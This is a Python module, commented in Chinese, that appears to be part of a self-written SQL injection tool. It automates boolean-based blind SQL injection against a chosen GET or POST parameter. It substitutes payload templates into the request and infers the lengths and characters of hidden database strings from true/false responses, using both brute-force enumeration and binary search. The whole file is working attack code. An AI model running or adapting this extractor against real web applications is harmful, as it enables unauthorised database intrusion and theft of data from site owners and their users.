import req
import random
import time
# dict_para_data ： 参数列表
# http_type ： get还是post
# vuln_para ： 易受攻击的参数
# payload ： 收攻击参数的值
# url
# expected_data ： 期待的返回结果 
def send_payload_by_bool(dict_para_data, http_type,vuln_para, payload, url, expected_data):
    # 布尔盲注GET
    if http_type == 1:
        # 替换掉注入的参数的数据为payload
        flag = 0
        for tmp_para in dict_para_data.keys():
            if tmp_para ==  vuln_para:
                dict_para_data[tmp_para] = payload
                flag = 1
                break
        if flag == 0:
            print("[!] Please enter the vulnable parameter!")
            return -1
        # 返回判断的结果，预期结果为1，否则为0
        return req.req_by_bool_get(dict_para_data, url, expected_data)
    # 布尔盲注POST
    if http_type == 2:
        flag = 0
        for tmp_para in dict_para_data.keys():
            if tmp_para ==  vuln_para:
                dict_para_data[tmp_para] = payload
                flag = 1
                break
        if flag == 0:
            print("[!] Please enter the vulnable parameter!")
            return -1
        # 返回判断的结果，预期结果为1，否则为0
        return req.req_by_bool_post(dict_para_data, url, expected_data)

# dict_para_data ： 参数列表
# vuln_para ： 易受攻击的参数
# http_type ： get还是post
# url
# expected_data ： 期待的返回结果  
def brute_enum_by_bool(dict_para_data, vuln_para, http_type, url, expected_data, payload_foo, str_foo, loop_freq):
    print('[*] The Bool-based blind injection is begin')
    brute_list1 = ", 0123456789abcdefghijklmnopqrstuvwxyz"
    result = ""
    result_len = 0
    loop_count = 0
    if 'int_foo' in payload_foo:
        loop_count = loop_count + 1
    else:
        print("[!] Please enter int_foo!")
        return 0
    if 'char_foo' in payload_foo:
        loop_count = loop_count + 1
    if 'str_foo' not in payload_foo:
        print("[!] Please enter str_foo!")
        return 0
    # 遍历到字符串第tmp_int个字符
    if loop_count == 2:
        # 这里需要优化，需要使用二分法
        for tmp_int in range(1,loop_freq):
            begin_time = time.time()
            flag = 0
            # 遍历的字符依次暴力枚举判断
            packet_count = 0
            for tmp_char in brute_list1:
                tmp_str = str(tmp_int)
                payload = payload_foo.replace('int_foo', tmp_str).replace('char_foo',tmp_char).replace('str_foo', str_foo)
                # 返回的结果为真
                packet_count += 1
                bool_result = send_payload_by_bool(dict_para_data, http_type, vuln_para, payload, url, expected_data)
                if bool_result == 1:
                    flag = 1
                    result = result + tmp_char
                    end_time = time.time()
                    print(f"[*] The finding result: {result}, total packet is: {packet_count}, total time spent: {round(end_time - begin_time,2)}s")
                    break
                elif bool_result == -1:     # 没有输入可注入的参数
                    return -1
            if flag != 1:
                return result
        return result
        if result == "":
            print("[*] There is no finding result")
            return 0

    # 如果只有单个循环，说明要遍历str_foo的长度
    if loop_count == 1:
        begin_time = time.time()
        # 这里需要优化，需要使用二分法
        packet_count = 0
        for tmp_int in range(1,loop_freq):
            # 确保数字正确拼接到字符串
            tmp_str = str(tmp_int)
            # 替换为正确的payload
            payload = payload_foo.replace('int_foo', tmp_str).replace('str_foo', str_foo)
            packet_count += 1
            bool_result = send_payload_by_bool(dict_para_data, http_type, vuln_para, payload, url, expected_data)
            if bool_result == 1:
                result_len = tmp_int
                end_time = time.time()
                print(f"[*] The {str_foo} is: {result_len}, total packet is: {packet_count}, total time spent: {round(end_time - begin_time,2)}s")
                return result_len
            elif bool_result == -1:     # 没有输入可注入的参数
                return -1

    
def binary_search_by_bool(dict_para_data, vuln_para, http_type, url, expected_data, payload_foo, str_foo, loop_freq):
    result = ""
    loop_count = 0
    if 'int_foo' in payload_foo:
        loop_count = loop_count + 1
    else:
        print("[!] Please enter int_foo!")
        return 0
    if 'char_foo' in payload_foo:
        loop_count = loop_count + 1
    if 'str_foo' not in payload_foo:
        print("[!] Please enter str_foo!")
        return 0
    # 遍历到字符串第tmp_int个字符
    if loop_count == 2:
        # 这里需要优化，需要使用二分法
        for tmp_int in range(1,loop_freq):
            begin_time = time.time()
            guess = random.randint(32,124)
            count = 0
            min = 32
            max = 124
            arr = []
            while True:
                tmp_str = str(tmp_int)
                tmp_char = str(guess)
                payload = payload_foo.replace('int_foo', tmp_str).replace('char_foo',tmp_char).replace('str_foo', str_foo)
                arr.append(guess)
                if guess in arr[:-1]:
                    result += chr(min)
                    end_time = time.time()
                    print(f"[*] The finding result: {result}, total packet is: {count}, total time spent: {round(end_time - begin_time,2)}s")
                    break
                
                bool_result = send_payload_by_bool(dict_para_data, http_type, vuln_para, payload, url, expected_data)
                if bool_result == 1:
                    max = guess
                    guess = (min + guess)//2
                    count += 1
                elif bool_result == 0:
                    min = guess
                    guess = (guess + max)//2
                    count += 1
                elif bool_result == -1:      # 没有输入可注入的参数
                    return -1
        return result
        if result == "":
            print("[*] There is no finding result")
            return 0

    # 如果只有单个循环，说明要遍历str_foo的长度
    if loop_count == 1:
        begin_time = time.time()
        # 这里需要优化，需要使用二分法
        guess = random.randint(0,500)
        count = 0
        min = 0
        max = 500
        arr = []
        while True:
            tmp_str = str(guess)
            payload = payload_foo.replace('int_foo', tmp_str).replace('str_foo', str_foo)
            # if guess == max or guess == min:
            arr.append(guess)
            if guess in arr[:-1]:
                end_time = time.time()
                print(f"[*] The finding result: {min}, total packet is: {count}, total time spent: {round(end_time - begin_time,2)}s")
                return guess
            bool_result = send_payload_by_bool(dict_para_data, http_type, vuln_para, payload, url, expected_data)
            if bool_result == 1:
                max = guess
                guess = (min + guess)//2
                count += 1
            elif bool_result == 0:
                min = guess
                guess = (guess + max)//2
                count += 1
            elif bool_result == -1:     # 没有输入可注入的参数
                return -1

